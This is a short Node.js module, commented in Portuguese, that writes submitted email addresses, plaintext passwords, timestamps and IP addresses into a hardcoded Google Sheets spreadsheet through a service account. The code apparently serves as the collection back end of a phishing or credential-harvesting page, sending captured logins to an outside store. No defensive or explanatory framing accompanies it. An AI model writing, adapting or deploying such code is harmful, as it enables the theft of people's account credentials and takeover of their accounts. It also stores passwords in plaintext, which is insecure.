const { google } = require('googleapis');

// ID da planilha (extraído da URL)
const SPREADSHEET_ID = '1VVUU_dCw-97FzKPquvgMsj9RncNsdxbG79zsOy5pQNI';

// Função para salvar credenciais no Google Sheets
async function saveToGoogleSheets(email, password, timestamp, ip) {
    try {
        // Autenticação usando Service Account ou OAuth
        // Para Service Account, você precisa de um arquivo JSON de credenciais
        // Para simplificar, vamos usar a API Key ou OAuth2
        
        // Se tiver credenciais de service account nas variáveis de ambiente
        const credentials = process.env.GOOGLE_SERVICE_ACCOUNT_JSON;
        
        if (!credentials) {
            console.log('Google Sheets não configurado (variável GOOGLE_SERVICE_ACCOUNT_JSON não encontrada)');
            return;
        }

        let auth;
        try {
            const serviceAccount = JSON.parse(credentials);
            auth = new google.auth.GoogleAuth({
                credentials: serviceAccount,
                scopes: ['https://www.googleapis.com/auth/spreadsheets']
            });
        } catch (error) {
            console.error('Erro ao parsear credenciais do Google:', error);
            return;
        }

        const sheets = google.sheets({ version: 'v4', auth });

        // Verificar se a coluna "email" existe, se não, criar cabeçalhos
        const range = 'Sheet1!A1:D1';
        const headerRange = await sheets.spreadsheets.values.get({
            spreadsheetId: SPREADSHEET_ID,
            range: 'Sheet1!A1:Z1'
        });

        const headers = headerRange.data.values?.[0] || [];
        const hasHeaders = headers.length > 0;

        // Se não tiver cabeçalhos, criar
        if (!hasHeaders || !headers.includes('email')) {
            await sheets.spreadsheets.values.update({
                spreadsheetId: SPREADSHEET_ID,
                range: 'Sheet1!A1:D1',
                valueInputOption: 'RAW',
                resource: {
                    values: [['Timestamp', 'email', 'Password', 'IP Address']]
                }
            });
        }

        // Adicionar nova linha
        const values = [[
            timestamp,
            email,
            password,
            ip
        ]];

        await sheets.spreadsheets.values.append({
            spreadsheetId: SPREADSHEET_ID,
            range: 'Sheet1!A:D',
            valueInputOption: 'RAW',
            insertDataOption: 'INSERT_ROWS',
            resource: {
                values: values
            }
        });

        console.log('Credenciais salvas no Google Sheets com sucesso!');
    } catch (error) {
        console.error('Erro ao salvar no Google Sheets:', error.message);
        throw error;
    }
}

module.exports = { saveToGoogleSheets };
